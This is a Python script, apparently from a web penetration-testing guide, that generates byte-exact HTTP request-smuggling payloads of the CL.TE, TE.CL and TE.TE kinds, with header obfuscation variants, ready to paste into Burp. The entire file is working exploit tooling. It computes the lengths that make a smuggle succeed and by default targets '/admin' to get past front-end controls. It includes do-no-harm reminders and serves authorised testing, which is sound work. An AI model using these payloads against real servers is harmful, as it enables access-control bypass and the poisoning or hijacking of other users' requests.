#!/usr/bin/env python3
"""
build_smuggle.py — build BYTE-EXACT CL.TE / TE.CL / TE.TE request-smuggling payloads with correct
Content-Length / chunk sizes, ready to paste into Burp Repeater (HTTP/1 raw) or Turbo Intruder.
(REQUEST_SMUGGLING_TESTING_GUIDE.md §5/§6/§8.)

This is a PAYLOAD BUILDER (it computes the exact lengths for you); it does NOT fire the request.
Confirm deterministically and exploit SAFELY (own connections, benign markers, do-no-harm — §18).

Usage:
  python3 build_smuggle.py --type clte --host target --smuggle-path /unique-smuggle-7f3a9
  python3 build_smuggle.py --type tecl --host target --smuggle "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
  python3 build_smuggle.py --type tete --host target --obf space
"""
import argparse

CRLF = "\r\n"

def clte(host, path):
    # front-end: Content-Length ; back-end: chunked. The "0\r\n\r\n" ends the chunked body for the
    # back-end; trailing bytes (a smuggled request line) prefix the NEXT request.
    prefix = f"GET {path} HTTP/1.1{CRLF}X-Ignore: "
    body = f"0{CRLF}{CRLF}{prefix}"
    cl = len(body)                   # front-end forwards the WHOLE body ("0\r\n\r\n" + your full GET prefix)
    req = (f"POST / HTTP/1.1{CRLF}"
           f"Host: {host}{CRLF}"
           f"Content-Length: {cl}{CRLF}"
           f"Transfer-Encoding: chunked{CRLF}"
           f"{CRLF}"
           f"{body}")
    note = ("CL.TE: front-end uses Content-Length=%d (forwards the whole body); back-end uses chunked and stops at "
            "'0', leaving your GET prefix to attach to the NEXT request on the connection. Lower CL only if you want "
            "to leak fewer bytes." % cl)
    return req, note

def tecl(host, smuggled):
    # front-end: chunked ; back-end: Content-Length. Embed a full smuggled request as one chunk; size it in hex.
    smuggled = smuggled.replace("\\r\\n", CRLF)
    chunk_data = smuggled                  # the full smuggled request the back-end parses as the NEXT request
    size_hex = format(len(chunk_data), "x")
    body = f"{size_hex}{CRLF}{chunk_data}{CRLF}0{CRLF}{CRLF}"
    # back-end Content-Length should cover only up to the first chunk-size line so it treats the rest as a new request
    cl = len(f"{size_hex}{CRLF}")
    req = (f"POST / HTTP/1.1{CRLF}"
           f"Host: {host}{CRLF}"
           f"Content-Length: {cl}{CRLF}"
           f"Transfer-Encoding: chunked{CRLF}"
           f"{CRLF}"
           f"{body}")
    note = ("TE.CL: front-end uses chunked (forwards all); back-end uses Content-Length=%d and treats the smuggled "
            "request as new. The chunk size '%s' must equal len(smuggled-data)=%d." % (cl, size_hex, len(chunk_data)))
    return req, note

OBF = {
    "space": "Transfer-Encoding : chunked",
    "tab": "Transfer-Encoding:\tchunked",
    "double": f"Transfer-Encoding: chunked{CRLF}Transfer-Encoding: x",
    "prefix": "Transfer-Encoding: xchunked",
    "fold": f"X: x{CRLF}\tTransfer-Encoding: chunked",
    "quote": 'Transfer-Encoding: "chunked"',
}

def tete(host, obf):
    te = OBF.get(obf, OBF["space"])
    body = f"0{CRLF}{CRLF}G"
    req = (f"POST / HTTP/1.1{CRLF}"
           f"Host: {host}{CRLF}"
           f"Content-Length: {len(body)}{CRLF}"
           f"{te}{CRLF}"
           f"{CRLF}"
           f"{body}")
    note = ("TE.TE: obfuscated Transfer-Encoding ('%s') is honored by only ONE tier, degrading to CL.TE/TE.CL. "
            "Try each obfuscation (space/tab/double/prefix/fold/quote)." % obf)
    return req, note

def show(req, note):
    print("# ---- byte-exact request (paste into Burp HTTP/1 raw / Turbo Intruder; \\r\\n shown as real CRLF) ----")
    print(req.replace(CRLF, "\\r\\n\n"))
    print("\n# note:", note)
    print("# CONFIRM: send, then a benign follow-up on YOUR connection — does it receive the smuggled prefix's response?")
    print("# DO NO HARM: benign markers, own connections, no sustained smuggles against live traffic (§18).")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--type", choices=["clte", "tecl", "tete"], required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--smuggle-path", default="/unique-smuggle-7f3a9")
    ap.add_argument("--smuggle", default="GET /admin HTTP/1.1\\r\\nHost: HOST\\r\\n\\r\\n")
    ap.add_argument("--obf", default="space", choices=list(OBF))
    a = ap.parse_args()
    if a.type == "clte":
        req, note = clte(a.host, a.smuggle_path)
    elif a.type == "tecl":
        req, note = tecl(a.host, a.smuggle.replace("HOST", a.host))
    else:
        req, note = tete(a.host, a.obf)
    show(req, note)

if __name__ == "__main__":
    main()
